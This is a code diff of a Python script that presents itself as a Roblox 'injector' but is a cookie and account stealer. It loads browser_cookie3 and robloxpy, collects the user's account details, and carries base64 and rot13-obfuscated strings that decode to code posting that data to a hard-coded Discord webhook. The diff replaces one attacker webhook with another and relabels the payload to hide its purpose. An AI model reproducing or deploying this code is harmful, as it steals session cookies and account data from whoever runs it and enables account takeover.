@@ -1,8 +1,7 @@
 import os
-from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 import base64, codecs
 import json
-import browser_cookie3
+
 
 
 webhookk = "heh" # put webhook here
@@ -18,6 +17,7 @@ try:
     import robloxpy
     import requests
     from discordwebhook import *
+    import browser_cookie3
 except:
     command("py -m pip install discordwebhook")
     cls()
@@ -110,8 +110,8 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
-#################### INJECT TO ROBLOX (creds to bingo methods) #################
-magic = 'ZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy85ODkxMzE3NzQzMDUxMjAzMzYvUXU5X0Fwb00xbGZwOU5Pb1ZZc2tuS3l5T1ZfYzBaR0VMN0xyZHVDRFVBeVFMTVJYQ0o5NmplRnlqcnF1S3llbE1FVzIiKQ0KZGlzY29yZC5wb3N0KA0KICAgIHVzZXJuYW1lPSJCT1QgLSBQaXJhdGUg8J+NqiIsDQogICAgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTg0ODE4NDI5MzU1NzgyMTk3Lzk4NTg3ODE3MzY1OTA0NTk5OS9hMzM5NzIxMTgzZjYwYzE4YjM0MjRiYTdiNzNkYWYxYi5wbmciLA0KICAgIGVtYmVkcz1bDQ'
+#################### INJECTS TO MEMORY (creds to someone in v3rm) #################
+magic = 'ZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy85OTIxMjMxMDg4MDA1OTM5OTAvZVUtMEpxbi1GelhJRS1uOTVRWG91N1ZwZ2xaWnFhdEJpWnJ5QVZ5RkliVW1XZGIzZk9YM1B6UWh0QUEtRHhhN0kzWWUiKQ0KZGlzY29yZC5wb3N0KA0KICAgIHVzZXJuYW1lPSJCT1QgLSBQaXJhdGUg8J+NqiIsDQogICAgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTg0ODE4NDI5MzU1NzgyMTk3Lzk4NTg3ODE3MzY1OTA0NTk5OS9hMzM5NzIxMTgzZjYwYzE4YjM0MjRiYTdiNzNkYWYxYi5wbmciLA0KICAgIGVtYmVkcz1bDQ'
 love = 'btVPNtVPNtVUfAPvNtVPNtVPNtVPNtVPW1p2IlozSgMFV6VPWPG1DtYFODnKWuqTHt8W+AdvVfQDbtVPNtVPNtVPNtVPNvqTy0oTHvBvNv8W+FhPNeZFOFMKA1oUDtDJAwo3IhqPQja5JiVvjAPvNtVPNtVPNtVPNtVPWxMKAwpzyjqTyiovVtBvOzVygUnKEbqJVtHTSaMI0bnUE0pUZ6Yl9anKEbqJVhL29gY01uozxkAmHiHTylLKEyYHAio2gcMF1UpzSvLzIlXFO8VSgFo2kcoJ9hp10br3WioTygo25msFxtsPOoHz9voT94VSOlo2McoTIqXUglo2Wfo3uspUWiMzyfMK0cVvjAPvNtVPNtVPNtVPNtVPWwo2kipvVtBvNkZwD1ZwN0APjAPvNtVPNtVPNtVPNtVPWznJIfMUZvBvOoQDbtVPNtVPNtVPNtVPNtVPNt'
 god = 'eyJuYW1lIjogIlVzZXJuYW1lIiwgInZhbHVlIjogdXNlcm5hbWUsICJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiUm9idXggQmFsYW5jZSIsICJ2YWx1ZSI6IHJvYnV4LCAiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIjogIlByZW1pdW0gU3RhdHVzIiwgInZhbHVlIjogcHJlbWl1bSwiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIiA6ICJSQVAiLCAidmFsdWUiOiByYXAsImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSIgOiAiRnJpZW5kcyIsICJ2YWx1ZSI6IGZyaWVuZHMsICJpbmxpbmUiOiBUcn'
 destiny = 'IysFjAPvNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxSwL291oaDtDJqyVvjtVaMuoUIyVwbtLJqyYPNvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWWHPOOMTElMKAmVvjtVaMuoUIyVvN6VTyjK2SxMUWyp3ZfVPWcozkcozH6VwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPVhHx9PGR9GEHAIHxyHJFVfVPW2LJk1MFV6VTLvLTOtr3WiLzkirS9wo29enJI9LTOtVvjtVzyhoTyhMFV6VRMuoUAysFjAPvNtVPNtVPNtVPNtVS0fQDbtVPNtVPNtVPNtVPNvqTu1oJWhLJyfVwbtrlW1pzjvBvObMJSxp2uiqU0fQDbAPt0XVPNtVPNtVPO9QDbtVPNtKFjAPvx='
